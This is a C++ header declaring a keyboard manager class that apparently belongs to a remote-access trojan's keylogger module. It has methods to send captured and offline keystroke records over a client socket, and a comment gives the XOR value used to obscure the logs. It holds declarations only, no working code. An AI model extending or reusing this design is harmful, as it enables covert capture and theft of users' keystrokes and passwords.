#pragma once
#include"../../PublicInclude/Manager.h"
#define	SIZE_IMM_BUFFER					128
#define	XOR_ENCODE_VALUE				99				// 键盘记录加密的xor值


class CKeyboardManager : public CManager
{
public:
	CKeyboardManager(CClientSocket* pClient);
	virtual ~CKeyboardManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	
private:
	int sendOfflineRecord();
	int sendStartKeyBoard();
	int sendKeyBoardData(LPBYTE lpData, UINT nSize);
	HANDLE hThread;
};

